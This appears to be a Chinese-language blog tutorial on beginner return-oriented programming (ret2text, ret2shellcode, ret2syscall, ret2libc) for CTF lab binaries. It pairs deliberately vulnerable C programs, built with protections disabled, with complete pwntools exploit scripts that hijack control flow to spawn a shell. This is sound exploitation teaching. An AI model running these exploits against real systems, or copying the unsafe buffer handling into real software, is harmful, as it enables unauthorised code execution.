---
title: 初级ROP
pubDate: 2026-03-11T19:11:00
---
## ret2text

### 原理

在没有栈保护下，直接栈溢出覆盖返回地址，实现控制程序执行程序本身已有的代码。

### 适用条件

- stack overflaw
- No canary
- backdoor
### 漏洞代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 这是一个后门函数，正常逻辑下永远不会被调用
void backdoor() {
    puts("Success! Here is your shell.");
    system("/bin/sh");
}

void vuln() {
    char buffer[20];
    puts("what's your name: ");
    // 漏洞点：gets 不检查长度，导致溢出
    gets(buffer);
    printf("hello,%s\n",buffer);
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式

```bash
gcc ./chall.c -o ./chall -g -fno-stack-protector -no-pie
```

### 攻击思路

第一步，发现函数gets，存在栈溢出

第二步，寻找后门函数，backdoor存在调用system('/bin/sh')，现在只要找到后门函数的地址，控制程序返回到这个地址就好了
### Payload 构造 

`[padding] + [saved rbp] + [return addr]`

根据调试发现offset(padding+saved rbp)为40，然后就是栈对齐和后门函数

### Exploit 示例

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")
rop = ROP(exe)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    offset = 0x20 + 8
    padding = cyclic(offset)
    fun_addr = exe.sym["backdoor"]
    ret_addr = rop.find_gadget(["ret"])[0]

    payload = flat([padding, ret_addr, fun_addr])

    p.recv()
    p.sendline(payload)

    # good luck pwning :)

    p.interactive()

if __name__ == "__main__":
    main()

```

### 常见问题

**栈对齐**

栈对齐指的是栈指针（如 x86-64 的 `rsp`）必须满足特定的内存地址对齐要求。在 x86-64 Linux 系统中，System V AMD64 ABI 调用约定规定：在 `call` 指令执行之前，栈必须 16 字节对齐（即 `rsp % 16 == 0`）。这是因为某些指令要求操作数地址为 16 字节对齐，否则会引发一般保护性异常（Segmentation Fault）导致程序崩溃。
## ret2shellcode

### 原理

在没有后门函数的情况下，程序可以写入字符串到可执行段，那么就可以将shellcode写入该段，然后控制程序执行该段的shellcode即可。
### 适用条件

- stack overflaw
- no NX
- writable & executable segment

### 漏洞代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln() {
    char buf[100];
    printf("The address of buf is: %p\n", buf); // 为了简化难度，题目直接告诉了我们 buf 的地址
    puts("Input your shellcode:");
    read(0, buf, 200); // 漏洞点：buf 只有 100，但读了 200，存在溢出
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式

```
gcc ./chall.c -o ./chall -fno-stack-protector -no-pie -z exectack
```
### 攻击思路

第一步，通过本地调试，拿到buf的地址：0x7fff736a1a60

```shell
└─$ ./ret2shellcode
The address of buf is: 0x7fff736a1a60
Input your shellcode:
124
```

第二步，确认buf为可执行段

```shell
└─$ checksec ret2shellcode
[*] '/home/kali/study/ctf-space/labs/ret2shellcode/ret2shellcode'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

### Payload 构造

`[nop sled] + [shellcode] + [padding] + [saved rbp] + [return addr]`

经过调试，offset为120，那么需要写完shell并补全偏移，然后是栈对齐和返回地址（buf_addr）
### Exploit 示例

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2shellcode_patched")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    offset = 0x70 + 8
    padding = cyclic(offset)

    p.recvuntil(b"is: ")
    leak_addr = p.recv(14)
    print(f"buf_addr: {leak_addr}")
    buf_addr = int(leak_addr, 16) + 10

    # good luck pwning :)

    ret_addr = rop.find_gadget(["ret"])[0]
    shellcode = asm(shellcraft.sh())
    shell = flat([b"\x90" * 20, shellcode]).ljust(offset, b"\x00")

    payload = flat([shell, ret_addr, buf_addr])
    p.recv()
    p.send(payload)

    p.interactive()


if __name__ == "__main__":
    main()

```

### 常见问题

泄露的的buf_addr字符串需要转换成16进制整数。

## ret2syscall

### 原理

NX开启，也就是在栈不可执行的时候，可以利用系统调用获取shell，也就是说只要把获取shell的系统调用的参数放到对应的寄存器中，再执行int 0x80就可以执行对应的系统调用。但是需要使用gadget来控制寄存器的值。

---

Linux应用程序调用系统调用的过程是：

1. 把系统调用的编号存入 EAX；
2. 把函数参数存入其它通用寄存器；
3. 触发 0x80 号中断（int 0x80）。

### 适用条件

- stack overflaw
- 系统调用指令
- a range of gadgets
- binsh_addr

### 漏洞代码

```c
#include <unistd.h>

const char *binsh = "/bin/sh";

void vuln() {
     char buf[32];
     puts("Give me some gadgets:");
     read(0, buf, 200); // 典型的栈溢出
 }

 int main() {
     vuln();
     return 0;
 }
```

### 编译方式

```
gcc ./chall.c -o ./chall -g -fno-stack-protector -no-pie -static -m32
```

### 攻击思路

第一步，目标是寻找`eax`、`ebx`、`ecx`、`edx`分别存储0xb、指向`/bin/sh`的地址、`0`、`0`

控制eax

```shell
└─$ ROPgadget --binary chall --only 'pop|ret' | grep 'eax'
0x08091e14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0809d32a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080b81b6 : pop eax ; ret
0x0809d329 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

控制edx、ecx、ebx

```shell
└─$ ROPgadget --binary chall --only 'pop|ret' | grep 'ebx'
0x0809d332 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x08091e14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0809d32a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b3cd : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809d6e4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080999fc : pop ebx ; pop edi ; ret
0x0806ee69 : pop ebx ; pop edx ; ret
0x0804f0a4 : pop ebx ; pop esi ; pop ebp ; ret
0x080483c7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a16d2 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08095dd1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x080710f9 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0804ab36 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049a4d : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x0804847e : pop ebx ; pop esi ; pop edi ; ret
0x0804986e : pop ebx ; pop esi ; pop edi ; ret 4
0x08048432 : pop ebx ; pop esi ; ret
0x080991a9 : pop ebx ; pop esi ; ret 8
0x080481c9 : pop ebx ; ret
0x080d353c : pop ebx ; ret 0x6f9
0x0806ee91 : pop ecx ; pop ebx ; ret
0x08062efb : pop edi ; pop esi ; pop ebx ; ret
0x0806ee90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809d329 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0808fb90 : pop es ; pop ebx ; pop esi ; pop edi ; ret
0x0807a810 : pop es ; pop ebx ; ret
0x0806ee68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c4a0 : pop esi ; pop ebx ; ret
0x0805ad40 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0809e182 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
```

然后是找`/bin/sh`

```shell
└─$ ROPgadget --binary chall --string '/bin/sh'
Strings information
============================================================
0x080bb328 : /bin/sh
```

第二步，找到`int 0x80`，触发`execve() `

```shell
└─$ ROPgadget --binary chall --only 'int'
Gadgets information
============================================================
0x0806cae5 : int 0x80
0x080bde8c : int 0xcf

Unique gadgets found: 2 
```

### Payload 构造

`[padding]+[eax]+[param_a]+[dcb]+[param_d][param_c]+[param_b]+[binsh]+[int 80]`

offset为44，利用寄存器存储相应的参数，并使用系统调用指令触发系统调用。
### Exploit 示例

```python
#!/usr/bin/env python3

from pwn import *

binary_path ="./chall_patched"
libc = ELF("./libc.so.6")
exe=ELF(binary_path)
rop=ROP(exe)

context(os="linux", arch="i386", log_level="debug")


def conn():
    if args.LOCAL:
        r = process([binary_path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def main():

    p = conn()

    offset=0x28+4
    padding=cyclic(offset)

    pop_eax_ret=rop.find_gadget(['pop eax','ret'])[0]
    pop_dcb_ret=rop.find_gadget(['pop edx','pop ecx','pop ebx','ret'])[0]
    ret_addr=rop.find_gadget(['ret'])[0]
    binsh=0x080bb328
    sys=0x0806cae5
    
    # good luck pwning :)

    payload=flat([padding,ret_addr,pop_eax_ret,0xb,pop_dcb_ret,0,0,binsh,sys])
    p.recv()
    p.sendline(payload)
    
    p.interactive()


if __name__ == "__main__":
    main()

```

### 常见问题

**系统调用指令**

在大佬的质问中，了解到32位系统和64位系统有很大的不同。😭

区别：

如果是 64 位程序，原理完全一样，但有四点不同：
调用号不同： 调用号存入 RAX (64位的 execve 是 59，即 0x3b)
寄存器不同： 参数顺序：RDI (filename), RSI (argv), RDX (envp)
触发指令不同： 使用 `syscall` 而不是 `int 0x80`
Gadget 查找： 需要找 `pop rdi; ret`, `pop rsi; ret` 等

## ret2libc

### 原理

本质是控制程序执行libc中的函数，返回到某个函数的plt处或者是函数对应的got表项的内容。目的是想方设法的让程序执行`system('/bin/sh')`。因为libc.so 动态链接库中的函数之间相对偏移是固定的，也就是说如果程序中没有给`system`和`/bin/sh`的地址，就可以通过泄露程序中某个函数在libc里的地址，那么就能确定程序使用的libc从而确认`system`和`/bin/sh`的地址。

泄露某个函数在libc里的地址可以通过got表泄露，泄露已经执行过的函数的地址。

---

利用过程

- 泄露某个函数地址
- 获取 libc 版本
- 获取 system 地址与 /bin/sh 的地址
- 再次执行源程序
- 触发栈溢出执行 system(‘/bin/sh’)

### 适用条件

- stack overflow
- leaked libc_func_addr

### 漏洞代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32];
    puts("Input:");
    read(0, buf, 100); // 溢出点
}

int main() {
    vuln();
    return 0;
}
```

### 编译方式 

```bash
gcc ./chall.c -o ./chall -fno-stack-protector -m32 -no-pie -z noexecstack
```

### 攻击思路

第一步，泄露libc中puts函数的got表地址

第二步，根据puts地址计算libc基址，得到system和binsh的地址

```python
    libc_base_addr = puts_addr - libc.sym["puts"]
    system_addr = libc_base_addr + libc.sym["system"]
    binsh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))
```
### Payload 构造

`[padding] + [saved rbp] + [puts_plt] + [main_addr] + [puts_got]`

return到puts函数，puts返回地址为main_addr，软重启程序，再加上param : puts_got

`[padding] + [saved ebp] + [system_addr] +  [0x5201314] + [binsh_addr]`

return到system函数，system返回地址随意，再加上param : binsh
### Exploit 示例

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    offset = 0x28 + 4
    padding = cyclic(offset)

    puts_plt = exe.plt["puts"]
    puts_got = exe.got["puts"]
    ret_addr = rop.find_gadget(["ret"])[0]
    main_addr = exe.sym["main"]

    leak = flat([padding, ret_addr, puts_plt, main_addr, puts_got])
    p.recv()
    p.send(leak)
    leak_addr = p.recv(4)
    print(f"leak_addr: {leak_addr}")
    puts_addr = u32(leak_addr.ljust(4, b"\0"))
    print(f"puts_addr: {hex(puts_addr)}")

    # good luck pwning :)
    libc_base_addr = puts_addr - libc.sym["puts"]
    system_addr = libc_base_addr + libc.sym["system"]
    binsh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))

    payload = flat([padding, ret_addr, system_addr, 0x5201314, binsh_addr])

    p.send(payload)

    p.interactive()


if __name__ == "__main__":
    main()

```

### 常见问题

**puts_addr**

将字节串 `leak_addr` 的长度扩展到 4 字节，将 4 字节的小端序字节串转换为一个 Python 整数（int）。
